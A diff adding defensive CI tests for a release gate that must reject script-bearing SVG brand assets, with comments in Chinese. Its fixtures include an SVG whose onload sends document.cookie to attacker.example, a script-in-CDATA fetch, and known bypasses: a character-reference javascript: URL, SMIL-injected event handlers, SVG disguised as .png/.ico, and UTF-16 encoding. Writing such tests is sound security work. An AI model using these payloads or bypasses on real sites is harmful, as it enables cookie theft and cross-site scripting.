@@ -367,6 +367,118 @@ function runChannels({ source, refName = '', ref, dest, list, env = {} }) {
   check(unknown.status === 0, '未知素材字段不应中止发布(只告警)')
   check(unknown.stderr.includes('logoo'), '未知素材字段应给出告警并点名')
 
+  // R7-RV-4(P3,复核 2026-09-13):素材脚本特征门禁必须**按结构**判定,不能在
+  // 整份正文上跑正则 —— 合法 SVG 的注释、<title>/<desc>/文本节点、CDATA 里写
+  // "导出时不要使用 onload= / javascript: URL"只是说明文字,旧实现会把这类
+  // 素材判成脚本素材、把**整条渠道发布**打回(fail-loud 误伤;桌面侧同款正则
+  // 命中时只是丢弃该素材,不拦发布)。
+  // R7-RV-5(P3):门禁还必须**按内容**判定 —— 素材的 Content-Type 是按文件名
+  // (扩展名)定的,把带脚本的 SVG 命名成 logo.png/logo.ico 就能同时绕过扩展名
+  // 检查与下发类型(服务端按 .png 下发,浏览器却按 SVG 文档渲染),所以凡"内容
+  // 像 XML/SVG 文档"的素材一律按 SVG 检查,不管扩展名。
+  const svgGateRepo = (assets, files) => {
+    const root = tempDir('ci-channels-svg-gate-')
+    mkdirSync(join(root, 'channels', 'official'), { recursive: true })
+    writeFileSync(join(root, 'channels', 'official', 'channel.json'), JSON.stringify({
+      schema: 1,
+      channel_id: 'official',
+      identity: { display_name: 'Official', short_name: 'Official' },
+      assets,
+    }))
+    for (const [fileName, content] of Object.entries(files)) {
+      writeFileSync(join(root, 'channels', 'official', fileName), content)
+    }
+    return root
+  }
+  const benignScriptishWords = [
+    '<?xml version="1.0" encoding="UTF-8" standalone="no"?>',
+    '<!-- 安全说明:导出时不要使用 onload= 事件属性或 javascript: URL -->',
+    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 4 4">',
+    '  <title>javascript: 与 onload= 都禁止</title>',
+    '  <desc><![CDATA[导出规范:禁用 javascript: URL / onload= 事件属性]]></desc>',
+    '  <text x="0" y="4" font-family="Arial">javascript: URL</text>',
+    '  <rect width="4" height="4"/>',
+    '</svg>',
+  ].join('\n')
+  const evilSvg = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 4 4" onload="fetch(\'//attacker.example/\'+document.cookie)"><script>alert(1)</script></svg>'
+
+  // 良性:脚本字样只出现在注释/标题/描述/CDATA 文本里 → 必须放行(不误伤发布)。
+  const benignGate = runChannels({
+    source: svgGateRepo(
+      { logo: 'logo.svg', logo_dark: 'logo-dark.svg', favicon: 'favicon.svg' },
+      { 'logo.svg': benignScriptishWords, 'logo-dark.svg': benignScriptishWords, 'favicon.svg': benignScriptishWords },
+    ),
+    refName: 'v2.7.0', dest: 'channels', list: 'p.list',
+  })
+  check(
+    benignGate.status === 0,
+    `脚本字样只出现在注释/文本节点里的合法 SVG 不得拦发布(实际 exit=${benignGate.status}: ${benignGate.stderr.trim()})`,
+  )
+
+  // 恶意改名:内容是可执行 SVG,扩展名是 .png/.ico → 必须按内容嗅探拦下。
+  for (const [key, fileName] of [['logo', 'logo.png'], ['favicon', 'favicon.ico']]) {
+    const renamed = runChannels({
+      source: svgGateRepo({ [key]: fileName }, { [fileName]: evilSvg }),
+      refName: 'v2.7.0', dest: 'channels', list: 'q.list',
+    })
+    check(
+      renamed.status !== 0,
+      `带脚本的 SVG 改名成 ${fileName} 必须被内容嗅探拦下(扩展名不是免检牌)`,
+    )
+    check(renamed.stderr.includes(`assets.${key}`), `改名绕过失败信息应点名 assets.${key}`)
+    check(
+      !`${renamed.stdout}${renamed.stderr}`.includes('attacker.example'),
+      '失败信息不得回显素材内容(只报字段名与特征种类)',
+    )
+  }
+
+  // UTF-16 编码的同一份恶意 SVG:嗅探必须解码后再判定,不能靠字节前缀漏掉。
+  const utf16Evil = Buffer.concat([
+    Buffer.from([0xff, 0xfe]),
+    Buffer.from(evilSvg, 'utf16le'),
+  ])
+  const utf16Gate = runChannels({
+    source: svgGateRepo({ logo: 'logo.png' }, { 'logo.png': utf16Evil }),
+    refName: 'v2.7.0', dest: 'channels', list: 'r.list',
+  })
+  check(utf16Gate.status !== 0, 'UTF-16 编码的恶意 SVG 必须同样被拦下')
+
+  // 结构判定的边界:CDATA 只在**元素外**是文本 —— <script><![CDATA[…]]></script>
+  // 里的 CDATA 是脚本内容,不得因为跳过 CDATA 而漏判。
+  const scriptCdata = runChannels({
+    source: svgGateRepo(
+      { logo: 'logo.svg' },
+      { 'logo.svg': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 4 4"><script><![CDATA[fetch(\'//attacker.example/x\')]]></script></svg>' },
+    ),
+    refName: 'v2.7.0', dest: 'channels', list: 's.list',
+  })
+  check(scriptCdata.status !== 0, '<script><![CDATA[…]]></script> 必须被拦下(CDATA 不是元素内脚本的豁免)')
+  check(scriptCdata.stderr.includes('assets.logo'), 'script 元素命中应点名 assets.logo')
+
+  // 结构判定的另外两个已知绕法:
+  //   - XML 数字字符引用会被解析器还原(`&#106;avascript:` === `javascript:`);
+  //   - SMIL 动画能把事件属性"写"进去(`<set attributeName="onload" to="…"/>`)。
+  for (const [label, svg] of [
+    ['字符引用伪装的 javascript: URL', '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 4 4"><a xlink:href="&#106;avascript:alert(1)"><rect width="4" height="4"/></a></svg>'],
+    ['SMIL 动画写入事件属性', '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 4 4"><rect width="4" height="4"><set attributeName="onload" to="alert(1)"/></rect></svg>'],
+  ]) {
+    const run = runChannels({
+      source: svgGateRepo({ logo: 'logo.svg' }, { 'logo.svg': svg }),
+      refName: 'v2.7.0', dest: 'channels', list: 't.list',
+    })
+    check(run.status !== 0, `${label} 必须被拦下`)
+  }
+
+  // 良性实体(`&amp;` 查询串、`&lt;` 文本)不得被字符引用解码逻辑误伤。
+  const benignEntity = runChannels({
+    source: svgGateRepo(
+      { logo: 'logo.svg' },
+      { 'logo.svg': '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 4 4"><image href="https://cdn.example.com/logo.png?a=1&amp;b=2" width="4" height="4"/><text x="0" y="4">A &amp; B &lt;svg&gt;</text></svg>' },
+    ),
+    refName: 'v2.7.0', dest: 'channels', list: 'u.list',
+  })
+  check(benignEntity.status === 0, `href 里的 &amp; 与文本里的 &lt; 不得被误判为脚本特征(实际 exit=${benignEntity.status})`)
+
   // 报错**不得回显品牌取值**:slug/app_id/scheme 的值就是客户品牌
   // (Acme-AI / com.acme.ai / acmeai),而这一步的输出去公开 Actions 日志。
   // 2026-09-10 审计当场发现早先版本把值拼进了错误信息 —— ::add-mask:: 只掩码
